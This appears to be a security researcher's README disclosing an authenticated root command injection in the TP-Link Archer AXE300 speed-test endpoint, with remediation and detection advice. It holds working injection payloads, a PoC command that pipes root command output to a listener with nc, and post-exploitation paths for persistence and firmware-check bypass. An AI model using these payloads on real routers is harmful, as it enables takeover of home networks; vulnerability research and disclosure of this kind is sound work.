# TP-Link Archer AXE300 — authenticated command injection in the ISP Speed Test (root RCE)

**`spdt_server` is concatenated into a shell command string and executed as root.**

> **Disclosure status.**
> This finding has **not** been reported to TP-Link, **not** sent to any vendor, **not** shared
> with any third party, and **not** published in an advisory, mailing list post, blog,
> conference talk, preprint, issue tracker, or chat anywhere else. No prior disclosure exists.
>
> The test was performed on the owner's own hardware with the owner's explicit permission and
> credentials. The device was returned to its original state afterwards — the verification is
> recorded in [`REPORT.md`](REPORT.md) §6 and [`evidence/device-state-after.txt`](evidence/device-state-after.txt).

**Author:** [@vindeckyy](https://github.com/vindeckyy) · **Date:** October 2026 · **License:** MIT (code), see [LICENSE](LICENSE)

**Legal notice:** Authorized research on hardware you own. No warranty, no liability, no
authorization to reach devices you do not own. Read the full
[Legal Disclaimer and Terms of Use](DISCLAIMER.md) before use.

---

## Contents

- [Summary](#summary)
- [Affected device](#affected-device)
- [The vulnerability](#the-vulnerability)
- [Full request path](#full-request-path)
- [Reproduction](#reproduction)
- [Impact and threat model](#impact-and-threat-model)
- [Secondary findings](#secondary-findings)
- [Surfaces tested and found clean](#surfaces-tested-and-found-clean)
- [Remediation](#remediation)
- [Detection and incident response](#detection-and-incident-response)
- [Platform notes](#platform-notes)
- [Repository layout](#repository-layout)

---

## Summary

| | |
|---|---|
| **Vulnerability** | OS command injection → arbitrary command execution as **root** |
| **Component** | ISP Speed Test, `spdt_server` request field |
| **Endpoint** | `POST /cgi-bin/luci/;stok=<token>/admin/speedtest?form=speedtest`, `operation=start` |
| **Vulnerable code** | `/usr/lib/lua/luci/model/spdt.lua` → `SPEED_TEST_INST:start_spt(form)` |
| **Privilege obtained** | `uid=0(root)` |
| **Authentication** | An admin web UI session (session token **plus** the `sysauth` cookie) |
| **User interaction** | None |
| **CVSS 3.1** | `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` → **7.2 (High)** |
| **CWE** | CWE-78 (OS command injection) → CWE-88 (argument injection) → CWE-269 (improper privilege management) |

The base score is 7.2 because the attacker needs an admin session. The *practical* severity is
higher: the affected device is the network edge, so a single injection yields the gateway
itself — every packet of every LAN client, every stored credential, and every IoT device
behind it.

**Proof in one command:**

```console
$ python3 poc/axe300_spdt_poc.py --host 192.168.0.1 --password '<admin-password>' --sleep 5
[*] logging in to 192.168.0.1 ...
[+] authenticated, session token acquired (32 chars)
[*] baseline request: 0.060 s
[+] injected 'sleep 5': request returned after 5.066 s (baseline was 0.060 s)
[+] command injection confirmed: the response time tracks the requested sleep duration.
```

**Proof with real command output, retrieved over the LAN:**

```console
$ python3 poc/axe300_spdt_poc.py --host 192.168.0.1 --password '<admin-password>' \
      --cmd '(id; uname -a; head -2 /etc/passwd) | nc 192.168.0.99 4530'
```

Received on the test host:

```
uid=0(root) gid=0(root)
Linux Archer_AXE300 4.19.183 #1 SMP PREEMPT Thu Nov 23 20:35:02 CST 2023 aarch64 GNU/Linux
root:x:0:0:root:/root:/bin/ash
sftpadmin:x:1001:0:sftpadmin:/var:/bin/false
```

---

## Affected device

| | |
|---|---|
| Model | TP-Link Archer AXE300 (AXE16000 Quad-Band Wi-Fi 6E), hardware v1.0 |
| Firmware | 1.0.11 Build 20241115 rel.76431(5553) |
| SoC | Broadcom BCM4908 class (`Broadcom-v8A`), 2 × Cortex-A53 |
| Kernel | Linux 4.19.183, aarch64, BusyBox v1.19.4 |
| Bootloader | U-Boot 5.04L.02p1 + ARM Trusted Firmware + OP-TEE, console on `ttyAMA0` 115200 |
| Web stack | uhttpd + LuCI (Lua), JSON API under `/cgi-bin/luci/;stok=<token>/…` |
| Userspace | OpenWrt 12.09-rc1 derivative (`model_brcm_bcm490x/generic`), `opkg` present |
| Storage | 256 MB SPI NOR, A/B firmware slots, UBI |

The vulnerable code path is in the vendor's LuCI model layer and is reached through the
admin page **Advanced → Network → Internet → Speed Test**. The same file, and the same
`sys.fork_call` pattern, appears across `/usr/lib/lua/luci/model/` — see
[Remediation](#remediation).

---

## The vulnerability

### Root cause

`/usr/lib/lua/luci/model/spdt.lua`, function `SPEED_TEST_INST:start_spt(form)`:

```lua
    if form then
        spdt_url = form.spdt_server        -- attacker-controlled, unvalidated
    end

    sys.fork_call("echo " .. spdt_url .. " > /tmp/log/spdt_url")
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
```

`spdt_url` comes straight from the request body field `spdt_server`. It is concatenated into
a shell command string with **no quoting, no escaping and no validation**, and `sys.fork_call`
executes that string through `/bin/sh -c`.

Three properties make this a direct root shell rather than a parsing curiosity:

1. **The sink runs before the parser.** The code below the `fork_call` parses the URL into
   `host`, `port` and `file_name` and rejects malformed values — but that parsing guards the
   *speed test* command, not the injection. The `fork_call` has already executed by then, so a
   payload that the parser would reject still runs.
2. **The router daemon is root.** `uhttpd` and the LuCI dispatchers run as root, so the forked
   shell is root. Verified: `uid=0(root) gid=0(root)`.
3. **The value is not a URL parser's problem.** `spdt_server` is documented as a URL, but the
   only consumer of that URL is the shell string above.

### Why it is exploitable

`sys.fork_call` → `/bin/sh -c "<string>"`. The classic `;` separator is enough:

```
spdt_server = http://127.0.0.1:9;sleep 5
```

expands to

```sh
echo http://127.0.0.1:9;sleep 5 > /tmp/log/spdt_url
```

The `sleep` runs as a root shell command. No escaping of quotes is needed because the value
is not quoted in the first place.

### The redirect subtlety (worth knowing before you build a PoC)

The vulnerable line ends in `> /tmp/log/spdt_url`. The shell attaches that redirection to the
**last** command of the injected payload, not to the `echo`. Observed on the device:

| Injected `spdt_server` | Result |
|---|---|
| `http://127.0.0.1:9;id > /tmp/out` | `/tmp/out` is created but **empty** — `id`'s stdout went to `/tmp/log/spdt_url` |
| `http://127.0.0.1:9;id > /tmp/out ; true` | `/tmp/out` contains `uid=0(root) gid=0(root)` |
| `http://127.0.0.1:9;cat /tmp/log/spdt_url \| nc <host> <port>` | nothing arrives — the redirect truncates the file before `cat` reads it |

So a reliable payload either ends with `; true` (parking the redirect on a harmless command)
or pipes straight to a listener with `; true` appended. The included PoC appends it
automatically.

---

## Full request path

```
browser / PoC
   │  POST /cgi-bin/luci/;stok=<token>/admin/speedtest?form=speedtest
   │  Cookie: sysauth=<session id>
   │  body: sign=<RSA signature>&data=<AES-CBC(base64 form)>
   ▼
uhttpd
   ▼
/usr/lib/lua/luci/dispatcher.lua
   │  sess = luci.http.getcookie("sysauth")        ← session lookup
   │  sdat = sauth.read(sess)
   │  elseif ctx.urltoken.stok == sdat.token then  ← token cross-check
   │      remote = not ctypes.check_ip_in_lan(ipaddr)
   │      if remote == sdat.remote then ... user = sdat.user
   ▼
/usr/lib/lua/luci/service.lua
   │  analyze_signature(sig, hasaeskey)   → aeskey, aesiv, hash, seq
   │  check_seqnum(seqnum, datalen, islogin)
   │  decrypt body with AES-128-CBC using the session's key
   ▼
/usr/lib/lua/luci/controller/admin/speedtest.lua
   │  dispatch_tbl.speedtest["start"] = {cb = start_speedtest}
   ▼
/usr/lib/lua/luci/model/spdt.lua
   │  spdt_url = form.spdt_server
   │  sys.fork_call("echo " .. spdt_url .. " > /tmp/log/spdt_url")   ← INJECTION
   ▼
/bin/sh -c  →  root shell
```

The authentication handshake is documented in full, with redacted values, in
[`evidence/session-auth-requirement.txt`](evidence/session-auth-requirement.txt). One detail
there cost this research more time than the vulnerability itself: **the session token in the
URL is not sufficient**. The router resolves the session from the `sysauth` cookie that the
login response sets. A client that drops the cookie still gets HTTP 200 — with an empty body
(`{"data":""}`), which reads as a broken protocol rather than a missing session.

---

## Reproduction

### Requirements

- Python 3.9+ and `cryptography` (`pip install cryptography`)
- A device you own, or one you are explicitly authorised to test
- The admin web UI credential

### Quick start

```console
$ pip install cryptography
$ git clone https://github.com/vindeckyy/tp-link-axe300-rce-findings.git
$ cd tp-link-axe300-rce-findings
$ python3 poc/axe300_spdt_poc.py --host 192.168.0.1 --password '<admin-password>' --sleep 5
```

This repository is **private** while the disclosure decision rests with the author, so cloning
it requires access (or a fork). The PoC itself is a single self-contained file with no
dependencies beyond `cryptography`, so copying `poc/axe300_spdt_poc.py` out of the repository
is enough to reproduce everything.

### PoC options

```
--host        target address (default 192.168.0.1)
--password    web UI password (or set AXE300_PASSWORD)
--username    web UI account (default admin)
--sleep N     timing proof: inject `sleep N` and measure (default 5)
--cmd CMD     inject an arbitrary command instead of the timing proof
--insecure    skip the baseline measurement
```

`--sleep` proves execution without touching anything: the response time tracks the requested
delay. `--cmd` runs an arbitrary command; the API does not return command output, so confirm
the effect on the device (write it to a file, or pipe it to a listener).

### Verification matrix

| Payload | Observed | Conclusion |
|---|---|---|
| `http://127.0.0.1:9` | 59–62 ms | baseline |
| `http://127.0.0.1:9;sleep 2` | 2062 ms | execution, linear with delay |
| `http://127.0.0.1:9;sleep 5` | 5063 ms | execution |
| `http://127.0.0.1:9;sleep 8` | 8061 ms | execution |
| `(id; uname -a; head -2 /etc/passwd) \| nc <host> <port>` | `uid=0(root)` etc. | arbitrary command, output retrieved |
| `test $(id -u) -eq 0` | delay | session is root |
| `test -r /etc/shadow` | delay | root can read the shadow file |

### Manual reproduction through the web UI

If you prefer to drive the router's own interface:

1. Log in at `http://192.168.0.1/` with the admin credential.
2. Read the session token from the page (`$.su.url.stok`) or from any
   `/cgi-bin/luci/;stok=<token>/…` request. The `sysauth` cookie comes with it.
3. `POST /cgi-bin/luci/;stok=<token>/admin/speedtest?form=speedtest` with the form fields
   the UI sends: `operation=start` and `spdt_server` set to the payload.

The request body must be encrypted the way the UI encrypts it — AES-128-CBC plus an
RSA-signed `sign` parameter — which is exactly what the PoC implements.

### A note on rate limiting

The router counts failed logins and locks the account; a failed login returns
`{"errorcode":"login failed", … "failureCount":3, "attemptsAllowed":7}`. Do not loop the PoC
against a router you depend on.

---

## Impact and threat model

**What an attacker needs:** one admin web UI credential, and a network path to port 80/443.

**What an attacker gets:** a root shell on the router.

**What that means in practice:**

- **Read and rewrite every setting.** UCI configuration under `/etc/config`, including the
  stored administrator credential and the Wi-Fi PSKs.
- **Become the network's man in the middle.** The device is the gateway: DNS, DHCP, parental
  controls and inter-VLAN rules are all under the attacker's control, and traffic can be
  silently redirected.
- **Persist.** The A/B flash layout means a custom image can be written to the inactive slot
  and survive reboots (see [Platform notes](#platform-notes)).
- **Pivot.** Every host behind the router — laptops, phones, cameras, doorbells — is one hop
  away, and the router can be used to attack them or to attack the upstream provider.
- **Denial of service.** A bricked router takes the whole LAN offline; the same applies to
  the firmware-update path, which is a single write away.

**What an attacker without the credential does *not* get:** nothing. The endpoint is behind a
valid session, the `stok` cross-check holds, and the unauthenticated admin API returns empty
bodies. This is an authenticated vulnerability, not a pre-auth one — but the credential it
requires is the credential the owner already types into the same page, and credential
phishing, reuse, or a brute force against a weak password is all it takes to reach root.

**Severity in context:** CVSS 3.1 base 7.2 (High) reflects the admin requirement. For a
consumer router, most people would call this Critical, because the blast radius is the entire
network rather than one host.

---

## Secondary findings

### The web UI password is also the SSH password

The firmware ships a patched dropbear already listening on **TCP/20001**:

```
/usr/sbin/dropbear -P /var/run/dropbear.1.pid -p 20001 -C -6 -B
```

`-C` selects *Web Server account login*: authentication is delegated to the router's web UI
account rather than to `/etc/shadow`, so **the admin web password is also the SSH password**.
`-6` disables IPv6 and `-B` permits blank passwords. `/sbin/knock_functions.sh` normally
installs an iptables REJECT rule for `dport 20001`, so the service is unreachable unless the
client IP is allow-listed — but that rule is one `iptables -D` away, and the attacker has
root by then.

### Root escalation from the non-root admin account

`/etc/group` grants supplementary group 0 to the web account:

```
root:x:0:admin,sftpadmin
```

`/etc/hotplug.d/iface` is group-writable, and cron runs `/bin/sh /etc/hotplug.d/iface/99-wportal`
**as root every minute**. Appending a line to that script from a shell that holds group 0
produces a root-owned file containing `uid=0(root) gid=0(root) groups=0(root)`.

This is reachable after Finding 1 (root already obtained) and is therefore best read as
**impact amplification and a persistence path** rather than an independent vulnerability. It
matters because it shows that the vendor's own hardening of the `admin` account — shell
`/bin/false`, non-existent home directory, `/root` mode 0700, and a group-writable root cron
script — does not survive contact with an attacker who has any foothold on the device.

### Other observations

- `/admin/syslog?form=mail` returns SMTP credentials (`smtp_server`, `user`, `password`) to
  the browser in cleartext.
- The web UI ships `config/modules.json` entries for features the backend does not implement
  on this build (Wake-on-LAN, TR-069/CWMP), and a `modules/homeShield` entry although the
  Avira `tmp_avira` owner check always fails.
- The speed-test CGI response body contains a second, embedded HTTP response
  (`Status: 200 OK` plus headers and body) — a response-splitting/parsing smell.
- The firmware image is encrypted (uniform ~8.0 bits/byte entropy), so static analysis needs
  either the vendor key or live-device analysis. Live analysis was used here.

---

## Surfaces tested and found clean

Recorded so they are not re-tested.

| Surface | Endpoint | Result |
|---|---|---|
| Diagnostics ping / traceroute | `/admin/diag?form=diag` (`ipaddr_ping`, `ipaddr_trace`) | Not injectable. The target is parsed, not shelled. |
| Diagnostics numeric fields | `count`, `pktsize`, `ttl` | Truncated with `atoi`-style parsing; `count=1;id` is rejected outright. |
| NTP server | `/admin/time?form=settings` (`ntp_svr1`, `ntp_svr2`) | Not injectable; the value is normalised on `;`. |
| CVE-2024-53375 (`tmp_avira`) | `/admin/smart_network?form=tmp_avira`, `operation=getInsightSites` | Handler present but gated: every `ownerId` returns `{"errorcode":"Invalid Owner Id","success":false}`. Not exploitable without a valid owner ID. |
| `locale` country write | `/locale?form=country` | `operation=write` returns `no such callback` to unauthenticated callers. |
| Wake-on-LAN | `/admin/wol?form=wake_up` | Not served by this build (`Not Found`). |
| TR-069 / CWMP | `/admin/cwmp?form=cwmp_setting` | Not served by this build (`Not Found`). |
| Unauthenticated admin API | `/admin/*` without a valid session | Returns `{"data":""}`; the token and cookie checks hold. |
| Default credentials | `login?form=keys` | Not default — a real RSA keypair is provisioned. |
| Avira services | — | Installed but **not running** on this unit. |

---

## Remediation

**For the vendor**

1. **Never build a shell command by concatenation.** Pass an argument vector, or validate
   against a strict allowlist such as
   `^https?://[A-Za-z0-9._-]+(:[0-9]{1,5})?/[A-Za-z0-9]+$`.
2. **Audit every call site.** The bug class is `fork_call("…" .. <request data> .. "…")`.
   `grep -rn 'fork_call\|os.execute' /usr/lib/lua/luci/model/` and review every hit that
   embeds request data. This one call site is an instance of that pattern, not a one-off.
3. **Shell-quote at minimum**, or better, use the `nixio` APIs that take arguments rather than
   a command string.
4. **Do not share a credential between the web UI and SSH**, and do not ship a patched
   dropbear that authenticates against the web account and accepts only `ssh-rsa`.
5. **Keep interactive-capable accounts out of the root group**, and remove group-write
   permission from executables and from scripts that root executes (cron, hotplug, init).
6. **Do not return stored credentials to the browser in cleartext** (the syslog SMTP case).

**Until a firmware update exists**

- Restrict admin access to the LAN, and never expose the management interface to the
  internet.
- Use a long, unique admin password, and change it if it has ever been reused elsewhere.
- Watch for the indicators below.

---

## Detection and incident response

**On the device**

| Indicator | Where |
|---|---|
| Commands executed from the speed test | `syslog` entries around `spdt`/`speedtest` activity |
| Unexpected processes | `ps` — anything not in the vendor's expected list |
| Modified web UI files | `/usr/lib/lua/luci/model/`, `/www/` (both are ramfs; compare after reboot) |
| Changed account files | `/etc/passwd`, `/etc/shadow` (`admin` shell, home directory) |
| Authorised keys or a new dropbear | `/etc/dropbear/`, `/root/.ssh/` |
| Extra listeners | `netstat -ltnp` — especially port 22 or a second dropbear |
| Non-empty `/tmp/log/spdt_url` containing shell metacharacters | speed test log file |

**Network side**

- DNS answers that do not match the configured resolvers.
- A management UI session that is not yours.
- Unexpected outbound SSH (TCP/20001) from the router.

**Recovery**

Revert the configuration files, remove added keys and processes, and flash a known-good
firmware image. Because `/etc` is a ramfs on this platform, a reboot clears most
filesystem-level changes — but not anything written to `/data`, `/tp_data`,
`/user_data1`, `/user_data2`, or to flash.

---

## Platform notes

The platform is more open than a consumer router usually is, which is worth recording for
anyone continuing the research. Full detail in
[`evidence/device-internals.txt`](evidence/device-internals.txt).

- **Broadcom BCM4908, OpenWrt-derived userspace.** `/etc/openwrt_release` reports
  `model_brcm_bcm490x/generic`, and `opkg` is present.
- **A/B flash slots with rollback metadata.** `metadata1`/`metadata2` hold
  `COMMITTED=1 / VALID=1,2 / SEQ=3,2`: slot 1 is committed, slot 2 is a valid older image.
  A custom image can be written to the inactive slot.
- **A flash programmer in userspace.** `/usr/bin/nvrammanager` exposes
  `-r/-w/-e -p <partition>`, `-u` (upgrade), `-c` (check), `-d` (derive) and `-s` (show),
  and can write the bootloader environment (`nvram set …; nvram commit`).
- **The vendor's own upgrade path skips its own check.** `fmup.lua` calls
  `nvrammanager -c` and then `/sbin/sysupgrade`, but `/lib/upgrade/platform.sh`'s
  `platform_check_image()` is a no-op, so calling `sysupgrade` directly bypasses the
  supported-model and anti-downgrade checks.
- **A documented bypass lever in the bootloader.** The loader contains
  `signature`, `verify`, `decryption` and both `test_mode=enable` and `test_mode=disable`,
  while the kernel command line carries `test_mode=disable`.
- **`/etc` is a ramfs.** Every edit to `/etc`, `/usr/lib/lua` and `/www` is lost on reboot;
  durable state lives in `/data`, `/tp_data`, `/user_data1`, `/user_data2`.
- **A serial console** on `ttyAMA0` at 115200 reaches the bootloader prompt.

For completeness, a measured performance profile of the unit — CPU headroom, the DNS cache
being disabled in the shipped configuration, bufferbloat measurements and the tunables that
were changed — is in
[`evidence/performance-profile.txt`](evidence/performance-profile.txt). That file is **not**
part of the disclosure; it is included because it documents the platform honestly and because
it explains why "free some CPU" is not the lever it appears to be on this hardware.

---

## Repository layout

| Path | Contents |
|---|---|
| [`REPORT.md`](REPORT.md) | The technical report: vulnerable code, both proof methods, impact, remediation, negative results, and the device cleanup record |
| [`poc/axe300_spdt_poc.py`](poc/axe300_spdt_poc.py) | Standalone proof of concept. Speaks the router's own JSON API (RSA-encrypted password, AES-CBC encrypted body, RSA signature) and proves the injection with a timing oracle or an arbitrary command |
| [`evidence/vulnerable-spdt.lua.txt`](evidence/vulnerable-spdt.lua.txt) | The extracted vulnerable Lua source and the client-side code that reaches it |
| [`evidence/session-auth-requirement.txt`](evidence/session-auth-requirement.txt) | The API handshake the PoC depends on, with all live values redacted |
| [`evidence/device-internals.txt`](evidence/device-internals.txt) | Flash layout, A/B metadata, the `nvrammanager` interface, the upgrade path, bootloader strings |
| [`evidence/performance-profile.txt`](evidence/performance-profile.txt) | Measured performance profile and the tunables that were changed |
| [`evidence/device-state-after.txt`](evidence/device-state-after.txt) | Post-cleanup device state, with notes |
| [`SECURITY.md`](SECURITY.md) | Disclosure status, what to do if you run the affected firmware, and how to report |
| [`DISCLAIMER.md`](DISCLAIMER.md) | Legal disclaimer and terms of use |
| [`LICENSE`](LICENSE) | MIT, for the code in this repository |

### Redaction

Every value that identifies the tested unit or authenticates to it has been removed from this
repository and from its history: the admin password, the `md5("admin" + password)` session
hash, the session secret, AES key and IV, session token, session id, client MAC and the
test host's address. Where the shape of a value matters to the explanation, a placeholder
with the format is shown instead.

---

## Acknowledgements

Thanks to the owner of the hardware, who authorised the test and supplied the credential.
The device was returned to its original state; the verification is in
[`evidence/device-state-after.txt`](evidence/device-state-after.txt).

If you are a vendor reading this and want to do the right thing: the disclosure status
above says this has not been reported yet. If it turns out that it has been, the report in
[`REPORT.md`](REPORT.md) is complete enough to reproduce and to fix.
